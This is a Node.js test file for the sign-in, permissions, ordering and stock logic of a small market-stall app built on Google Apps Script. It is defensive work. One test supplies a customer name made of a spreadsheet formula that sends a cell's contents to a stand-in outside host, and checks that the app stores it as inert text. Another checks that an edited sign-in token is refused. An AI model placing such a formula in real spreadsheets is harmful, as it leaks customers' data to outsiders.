/**
 * Runs the real server/*.gs files in Node against an in-memory spreadsheet,
 * with Google's services replaced by small fakes. No network, no Google.
 *
 *   node tests/server.test.js
 *
 * Covers sign-in and permissions, the part where a mistake locks people out
 * or lets the wrong person in.
 */
'use strict';
const fs = require('fs');
const path = require('path');
const vm = require('vm');
const crypto = require('crypto');
const assert = require('assert');

/* ---------- fakes for the Apps Script services ---------- */

function makeSheet() {
  const rows = [];
  const sheet = {
    rows,
    appendRow(r) { rows.push(r.slice()); },
    getLastRow() { return rows.length; },
    getLastColumn() { return rows.reduce((m, r) => Math.max(m, r.length), 0); },
    getRange(r, c, nr, nc) {
      nr = nr || 1; nc = nc || 1;
      return {
        getValues() {
          const out = [];
          for (let i = 0; i < nr; i++) {
            const row = rows[r - 1 + i] || [];
            const o = [];
            for (let j = 0; j < nc; j++) o.push(row[c - 1 + j] === undefined ? '' : row[c - 1 + j]);
            out.push(o);
          }
          return out;
        },
        getValue() { return this.getValues()[0][0]; },
        setValue(v) { (rows[r - 1] = rows[r - 1] || [])[c - 1] = v; return this; },
        setValues(vs) {
          vs.forEach((row, i) => row.forEach((v, j) => {
            (rows[r - 1 + i] = rows[r - 1 + i] || [])[c - 1 + j] = v;
          }));
          return this;
        },
        setFontWeight() { return this; }, setBackground() { return this; },
        setFontColor() { return this; }
      };
    },
    deleteRow(n) { rows.splice(n - 1, 1); },
    deleteRows(n, k) { rows.splice(n - 1, k); },
    setFrozenRows() {}
  };
  return sheet;
}

function load(googleTokens) {
  const sheets = {};
  const props = {};
  const ctx = {
    console,
    SpreadsheetApp: {
      getActiveSpreadsheet: () => ({
        getSheetByName: (n) => sheets[n] || null,
        insertSheet: (n) => (sheets[n] = makeSheet())
      })
    },
    PropertiesService: {
      getScriptProperties: () => ({
        getProperty: (k) => (k in props ? props[k] : null),
        setProperty: (k, v) => { props[k] = v; }
      })
    },
    Utilities: {
      getUuid: () => crypto.randomUUID(),
      computeHmacSha256Signature: (v, key) =>
        Array.from(crypto.createHmac('sha256', key).update(v).digest()).map((b) => (b > 127 ? b - 256 : b)),
      formatDate: (d, tz, f) => (f === 'yyyy-MM-dd' ? d.toISOString().slice(0, 10) : d.toISOString())
    },
    LockService: { getScriptLock: () => ({ waitLock() {}, releaseLock() {} }) },
    UrlFetchApp: {
      fetch: (url) => {
        const tok = decodeURIComponent(url.split('id_token=')[1]);
        const info = googleTokens[tok];
        return {
          getResponseCode: () => (info ? 200 : 400),
          getContentText: () => JSON.stringify(info || { error: 'invalid_token' })
        };
      }
    },
    ScriptApp: { getService: () => ({ getUrl: () => 'https://example/exec' }) },
    ContentService: {}, HtmlService: {}
  };
  vm.createContext(ctx);
  // Start every test from "Google off", whatever Platform.gs currently holds.
  const dir = path.join(__dirname, '..', 'server');
  fs.readdirSync(dir).filter((f) => f.endsWith('.gs')).sort().forEach((f) => {
    vm.runInContext(fs.readFileSync(path.join(dir, f), 'utf8'), ctx, { filename: f });
  });
  ctx.SF.PLATFORM.googleClientId = '';
  ctx.SF.PLATFORM.admins = [];
  ctx.SF.migrate();
  return { SF: ctx.SF, sheets };
}

const CLIENT = 'client-123.apps.googleusercontent.com';
const future = String(Math.floor(Date.now() / 1000) + 3600);
function idToken(email, extra) {
  return Object.assign({ aud: CLIENT, iss: 'https://accounts.google.com',
                         email, email_verified: 'true', exp: future, name: 'Test' }, extra || {});
}
const TOKENS = {
  admin: idToken('Boss@StallFlow.co.za'),
  helper: idToken('helper@gmail.com'),
  stranger: idToken('stranger@gmail.com'),
  wrongAud: idToken('helper@gmail.com', { aud: 'someone-else' }),
  unverified: idToken('helper@gmail.com', { email_verified: 'false' })
};

let failures = 0;
function test(name, fn) {
  try { fn(); console.log('ok   ' + name); }
  catch (e) { failures++; console.log('FAIL ' + name + '\n     ' + e.message); }
}
const signIn = (SF, credential) => SF.dispatch('signInGoogle', { credential, device: 'd1' }).data;

/* ---------- PIN mode, before Google is switched on ---------- */

test('without a client ID, PIN sign-in still works', () => {
  const { SF } = load(TOKENS);
  assert.strictEqual(SF.googleOn(), false);
  SF.setPin('owner', '4321');
  const r = SF.dispatch('signIn', { pin: '4321', device: 'd1' }).data;
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.role, 'owner');
  assert.strictEqual(SF.dispatch('health', { token: r.token }).ok, true);
});

test('without a client ID, Google sign-in is refused', () => {
  const { SF } = load(TOKENS);
  assert.strictEqual(signIn(SF, 'admin').ok, false);
});

test('a client ID with no admins leaves PINs on, so nobody is locked out', () => {
  const { SF } = load(TOKENS);
  SF.PLATFORM.googleClientId = CLIENT;
  SF.PLATFORM.admins = [];
  assert.strictEqual(SF.googleOn(), false);
  SF.setPin('owner', '4321');
  assert.strictEqual(SF.dispatch('signIn', { pin: '4321', device: 'd1' }).data.ok, true);
});

/* ---------- Google mode ---------- */

function google() {
  const env = load(TOKENS);
  env.SF.PLATFORM.googleClientId = CLIENT;
  env.SF.PLATFORM.admins = ['boss@stallflow.co.za'];
  return env;
}

test('a platform admin signs in as owner, whatever the case of the email', () => {
  const { SF } = google();
  const r = signIn(SF, 'admin');
  assert.strictEqual(r.ok, true);
  assert.strictEqual(r.role, 'owner');
  assert.strictEqual(r.user, 'boss@stallflow.co.za');
});

test('someone not on the list is turned away with a clear message', () => {
  const { SF } = google();
  const r = signIn(SF, 'stranger');
  assert.strictEqual(r.ok, false);
  assert.ok(/not been added/.test(r.message));
});

test('a token for another app, or an unverified email, is refused', () => {
  const { SF } = google();
  SF.append('users', { Email: 'helper@gmail.com', Role: 'cashier', Active: 'Yes' });
  assert.strictEqual(signIn(SF, 'wrongAud').ok, false);
  assert.strictEqual(signIn(SF, 'unverified').ok, false);
  assert.strictEqual(signIn(SF, 'nonsense').ok, false);
});

test('PINs stop working once Google is on', () => {
  const { SF } = load(TOKENS);
  SF.setPin('owner', '4321');
  const pinToken = SF.dispatch('signIn', { pin: '4321', device: 'd1' }).data.token;
  SF.PLATFORM.googleClientId = CLIENT;
  SF.PLATFORM.admins = ['boss@stallflow.co.za'];
  assert.strictEqual(SF.dispatch('signIn', { pin: '4321', device: 'd1' }).data.ok, false);
  assert.strictEqual(SF.dispatch('signIn', { pin: '', device: 'd1' }).data.ok, false,
    'a blank PIN must not give owner access any more');
  assert.strictEqual(SF.dispatch('health', { token: pinToken }).code, 'auth');
});

test('the owner adds a cashier, who can sell but not see People', () => {
  const { SF } = google();
  const owner = signIn(SF, 'admin').token;
  const add = SF.dispatch('savePerson', { token: owner, opId: 'a1', email: 'Helper@Gmail.com',
                                           role: 'cashier' });
  assert.strictEqual(add.ok, true);
  const helper = signIn(SF, 'helper');
  assert.strictEqual(helper.ok, true);
  assert.strictEqual(helper.role, 'cashier');
  assert.strictEqual(SF.dispatch('till', { token: helper.token }).ok, true);
  assert.strictEqual(SF.dispatch('people', { token: helper.token }).code, 'forbidden');
});

test('promoting someone works on their next tap, without signing in again', () => {
  const { SF } = google();
  const owner = signIn(SF, 'admin').token;
  SF.dispatch('savePerson', { token: owner, opId: 'a1', email: 'helper@gmail.com', role: 'cashier' });
  const helper = signIn(SF, 'helper').token;
  assert.strictEqual(SF.dispatch('people', { token: helper }).code, 'forbidden');
  SF.dispatch('savePerson', { token: owner, opId: 'a2', email: 'helper@gmail.com', role: 'owner' });
  assert.strictEqual(SF.dispatch('people', { token: helper }).ok, true);
});

test('switching someone off locks them out straight away', () => {
  const { SF } = google();
  const owner = signIn(SF, 'admin').token;
  SF.dispatch('savePerson', { token: owner, opId: 'a1', email: 'helper@gmail.com', role: 'manager' });
  const helper = signIn(SF, 'helper').token;
  SF.dispatch('savePerson', { token: owner, opId: 'a2', email: 'helper@gmail.com', role: 'manager',
                              active: false });
  assert.strictEqual(SF.dispatch('till', { token: helper }).code, 'auth');
  assert.strictEqual(signIn(SF, 'helper').ok, false);
});

test('a platform admin cannot be demoted, and nobody can change their own access', () => {
  const { SF } = google();
  const owner = signIn(SF, 'admin').token;
  assert.strictEqual(SF.dispatch('savePerson', { token: owner, opId: 'a1',
    email: 'boss@stallflow.co.za', role: 'viewer' }).ok, false);
  SF.dispatch('savePerson', { token: owner, opId: 'a2', email: 'helper@gmail.com', role: 'owner' });
  const helper = signIn(SF, 'helper').token;
  assert.strictEqual(SF.dispatch('savePerson', { token: helper, opId: 'a3',
    email: 'helper@gmail.com', role: 'viewer' }).ok, false);
});

test('a forged or edited token is refused', () => {
  const { SF } = google();
  const t = signIn(SF, 'admin').token.split('|');
  t[3] = 'helper@gmail.com';
  assert.strictEqual(SF.dispatch('health', { token: t.join('|') }).code, 'auth');
});

test('the audit trail names the person, not just the role', () => {
  const { SF, sheets } = google();
  const owner = signIn(SF, 'admin').token;
  SF.dispatch('savePerson', { token: owner, opId: 'a1', email: 'helper@gmail.com', role: 'cashier' });
  const actors = sheets.Audit.rows.slice(1).map((r) => r[1]);
  assert.ok(actors.indexOf('boss@stallflow.co.za') !== -1, actors.join(', '));
});

test('boot tells the app who is signed in and that Google is on', () => {
  const { SF } = google();
  const owner = signIn(SF, 'admin').token;
  const b = SF.dispatch('boot', { token: owner }).data;
  assert.strictEqual(b.me.user, 'boss@stallflow.co.za');
  assert.strictEqual(b.auth.google, true);
});

/* ---------- orders from the public page ---------- */

function shop(marketDate) {
  const env = load(TOKENS);
  const SF = env.SF;
  SF.append('products', { ProductId: 'P01', Name: 'Apricot Jam', Type: 'stocked', Unit: 'each',
                          Price: 70, Active: 'Yes', Sort: 10 });
  SF.move('P01', 10, 'adjust', 'test');
  SF.append('markets', { MarketId: 'M01', Name: 'Test Market', Date: marketDate, Status: 'planned' });
  SF.set('activeMarket', 'M01');
  return env;
}
const day = (n) => new Date(Date.now() + n * 864e5).toISOString().slice(0, 10);
let op = 0;
const order = (SF, extra) => SF.dispatch('placeOrder', Object.assign({
  opId: 'o' + (op++), name: 'Anna', phone: '082 123 4567', consent: true,
  lines: [{ id: 'P01', qty: 1 }] }, extra || {}));

test('a formula typed as a name is stored as plain text', () => {
  const { SF, sheets } = shop(day(3));
  assert.strictEqual(order(SF, { name: '=IMAGE("https://x.example/?"&D2)', note: '+1 more' }).ok, true);
  const row = sheets.Orders.rows[1];
  assert.ok(String(row[4]).startsWith("'="), 'name: ' + row[4]);
  assert.ok(String(row[13]).startsWith("'+"), 'note: ' + row[13]);
});

test('one phone number can hold at most 2 unpaid orders per market', () => {
  const { SF } = shop(day(3));
  assert.strictEqual(order(SF).ok, true);
  assert.strictEqual(order(SF, { phone: '0821234567' }).ok, true);
  const third = order(SF, { phone: '+27 82 123 4567'.replace('+27 ', '0') });
  assert.strictEqual(third.ok, false);
  assert.ok(/already has 2/.test(third.message));
  assert.strictEqual(order(SF, { phone: '083 999 0000' }).ok, true, 'someone else can still order');
});

test('pre-orders close by themselves once the market date has passed', () => {
  const { SF } = shop(day(-1));
  assert.strictEqual(SF.preordersOpen(), false);
  assert.strictEqual(order(SF).ok, false);
  assert.strictEqual(SF.dispatch('catalogue', {}).data.open, false);
});

test('pre-orders stay open on the day of the market', () => {
  const { SF } = shop(day(0));
  assert.strictEqual(order(SF).ok, true);
});

test('releasing unpaid reservations puts the stock back', () => {
  const { SF } = shop(day(3));
  order(SF); order(SF, { phone: '083 999 0000' });
  assert.strictEqual(SF.onHand().P01, 8);
  SF.setPin('owner', '4321');
  const t = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  const r = SF.dispatch('releaseUnpaid', { token: t, opId: 'r1' });
  assert.strictEqual(r.released, 2);
  assert.strictEqual(SF.onHand().P01, 10);
});

test('customer details are wiped once their market is over, and only then', () => {
  const { SF, sheets } = shop(day(3));
  order(SF, { note: 'gate 2' });
  SF.purgeCustomers();
  assert.strictEqual(String(sheets.Orders.rows[1][4]), 'Anna', 'live market keeps its customers');
  SF.append('markets', { MarketId: 'M02', Name: 'Next', Date: day(10), Status: 'planned' });
  SF.set('activeMarket', 'M02');
  assert.strictEqual(SF.purgeCustomers(), 0, 'a future market is not over yet');
  SF.setCell('markets', 2, 'Date', day(-1));
  assert.strictEqual(SF.purgeCustomers(), 1);
  const row = sheets.Orders.rows[1];
  assert.deepStrictEqual([row[4], row[5], row[13]], ['Customer', '', '']);
  assert.strictEqual(row[8], 70, 'the money stays');
});

test('the Duxies stocktake loads prices and counts, and running it twice changes nothing', () => {
  const { SF } = shop(day(3));
  const ctx = vm.createContext(Object.assign({}, { SF, SpreadsheetApp: {} }));
  // Stocktake.gs only needs SF, so run it in a small context that shares it.
  ['Costing.gs', 'Stocktake.gs'].forEach((f) => vm.runInContext(
    fs.readFileSync(path.join(__dirname, '..', 'stalls', 'duxies', f), 'utf8'), ctx));
  SF.pots = () => ctx.sfPots();
  SF.newPot = (n) => ctx.sfNewPot(n);   // in Apps Script every file shares one global scope
  const first = ctx.sfApplyStocktake();
  assert.strictEqual(first.off, 1, 'the old placeholder jam is switched off');
  assert.strictEqual(SF.onHand().P01, 0, 'and its jars no longer count');
  const ps = SF.products();
  const find = (n, v) => ps.find((p) => p.name === n && p.variant === v);
  assert.strictEqual(find('Strawberry', '125 ml').onHand, 17);
  assert.strictEqual(find('Strawberry', '352 ml').price, 70);
  assert.strictEqual(find('Fig', '125 ml').price, 50);
  assert.strictEqual(find('Orange Marmalade Whiskey', 'Medium (odd bottle)').price, 60);
  assert.strictEqual(find('Butter Biscuits', '300 g pack').type, 'made');
  assert.strictEqual(first.jars, 225);
  const big = find('Strawberry', '352 ml').cost, small = find('Strawberry', '125 ml').cost;
  assert.ok(big > 30 && big < 40, 'a big strawberry jar costs about R34, got ' + big);
  assert.ok(small > 7.8 && small < big, 'a small jar costs its bottle and less fruit');
  assert.ok(find('Butter Biscuits', '300 g pack').cost > 20);
  assert.strictEqual(find('Crunchies', '300 g pack').cost, 0, 'no recipe, no guess');
  assert.strictEqual(find('Strawberry', '352 ml').onHand, 14, 'a bottle cost adds no stock');
  const again = ctx.sfApplyStocktake();
  assert.deepStrictEqual([again.added, again.moved], [0, 0]);
  assert.strictEqual(find('Strawberry', '352 ml').cost, SF.products().find((p) => p.name === 'Strawberry' && p.variant === '352 ml').cost);
  assert.strictEqual(SF.rows('batches').length, again.costed, 'running it again updates, never duplicates');

  // Cooking a pot: pre-filled recipe, jars on the shelf, cupboard goes down.
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  SF.dispatch('savePantry', { token: tok, opId: 'c1', item: 'Strawberries', qty: 5, unit: 'kg' });
  SF.dispatch('savePantry', { token: tok, opId: 'c2', item: 'Sugar', qty: 2000, unit: 'g' });
  SF.dispatch('savePantry', { token: tok, opId: 'c3', item: '352 ml bottles', qty: 10, unit: 'each' });
  const st = SF.dispatch('stock', { token: tok }).data;
  const pot = st.pots.find((x) => x.name === 'Strawberry');
  assert.strictEqual(st.pantry.some((r) => r.item === 'Odd bottles'), true, 'the cupboard lists what pots use');
  const bigId = pot.sizes.find((x) => x.variant === '352 ml').productId;
  const smallId = pot.sizes.find((x) => x.variant === '125 ml').productId;
  const before = SF.onHand()[bigId];
  const res = SF.dispatch('cookPot', { token: tok, opId: 'c4', name: 'Strawberry', lines: pot.lines,
                                       jars: { [bigId]: 5, [smallId]: 3 } });
  assert.strictEqual(res.ok, true, res.message);
  assert.strictEqual(SF.onHand()[bigId], before + 5);
  const left = Object.fromEntries(SF.pantry().map((r) => [r.item, r.qty]));
  assert.deepStrictEqual([left.Strawberries, left.Sugar, left['352 ml bottles']], [2, 0, 5]);
  // Changing the usual recipe, and starting a new jam.
  const lines2 = pot.lines.concat([{ label: 'Lemon juice', qty: 1, unit: 'pot', price: 5 }]);
  assert.strictEqual(SF.dispatch('saveRecipe', { token: tok, opId: 'r1', name: 'Strawberry',
                                                 makes: 6, lines: lines2 }).ok, true);
  const pot2 = SF.dispatch('stock', { token: tok }).data.pots.find((x) => x.name === 'Strawberry');
  assert.ok(pot2.lines.some((l) => l.label === 'Lemon juice'), 'the saved recipe is used');
  const nu = SF.dispatch('saveRecipe', { token: tok, opId: 'r2', name: 'Quince', makes: 6,
                                         lines: [{ label: 'Quinces', qty: 3, unit: 'kg', price: 20 }] });
  assert.strictEqual(nu.isNew, true);
  const q = SF.dispatch('stock', { token: tok }).data.pots.find((x) => x.name === 'Quince');
  assert.strictEqual(q.sizes.length, 2, 'a new jam gets its sizes on the shelf list');
  assert.strictEqual(SF.dispatch('cookPot', { token: tok, opId: 'c5', name: 'Strawberry',
                                              lines: pot.lines, jars: {} }).ok, false);
});

test('a sale between markets is kept apart from the live market', () => {
  const { SF } = shop(day(3));
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  SF.dispatch('sell', { token: tok, opId: 's1', lines: [{ id: 'P01', qty: 1 }] });
  SF.dispatch('sell', { token: tok, opId: 's2', where: 'home', lines: [{ id: 'P01', qty: 2 }] });
  const at = SF.dispatch('dashboard', { token: tok, marketId: 'M01' }).data;
  const home = SF.dispatch('dashboard', { token: tok, marketId: 'HOME' }).data;
  assert.ok(at.markets.some((m) => m.id === 'HOME'), 'Numbers can pick it');
  assert.strictEqual(SF.onHand().P01, 7, 'both sales come off the shelf');
  const total = (d) => JSON.stringify(d).match(/"revenue":(\d+)/)[1];
  assert.strictEqual(total(at), '70');
  assert.strictEqual(total(home), '140');
});

test('two markets on the same day keep their own sales', () => {
  const { SF } = shop(day(3));
  SF.append('markets', { MarketId: 'M02', Name: 'RNW', Date: day(3), Status: 'planned' });
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  SF.dispatch('sell', { token: tok, opId: 'a', marketId: 'M01', lines: [{ id: 'P01', qty: 1 }] });
  SF.dispatch('sell', { token: tok, opId: 'b', marketId: 'M02', lines: [{ id: 'P01', qty: 2 }] });
  SF.dispatch('sell', { token: tok, opId: 'c', marketId: 'nonsense', lines: [{ id: 'P01', qty: 1 }] });
  const t1 = SF.dispatch('till', { token: tok, marketId: 'M01' }).data;
  const t2 = SF.dispatch('till', { token: tok, marketId: 'M02' }).data;
  assert.strictEqual(t1.totals.tillTotal, 140, 'an unknown market falls back to the live one');
  assert.strictEqual(t2.totals.tillTotal, 140);
  assert.ok(t1.markets.some((m) => m.id === 'M02') && t1.markets.some((m) => m.id === 'HOME'));
});

test('uncooked stock is a list she can add to and update', () => {
  const { SF } = shop(day(3));
  SF.setPin('owner', '4321');
  const tok = SF.dispatch('signIn', { pin: '4321', device: 'd' }).data.token;
  SF.dispatch('savePantry', { token: tok, opId: 'p1', item: 'Sugar', qty: 5, unit: 'kg' });
  SF.dispatch('savePantry', { token: tok, opId: 'p2', item: 'sugar', qty: 2.5, unit: 'kg' });
  SF.dispatch('savePantry', { token: tok, opId: 'p3', item: '352 ml bottles', qty: 24, unit: 'each' });
  const p = SF.dispatch('stock', { token: tok }).data.pantry;
  assert.strictEqual(JSON.stringify(p.map((r) => [r.item, r.qty])), '[["352 ml bottles",24],["Sugar",2.5]]');
  assert.strictEqual(SF.dispatch('savePantry', { token: tok, opId: 'p4', item: 'x', qty: 1 }).ok, false);
});

console.log(failures ? '\n' + failures + ' failed' : '\nall passed');
process.exit(failures ? 1 : 0);
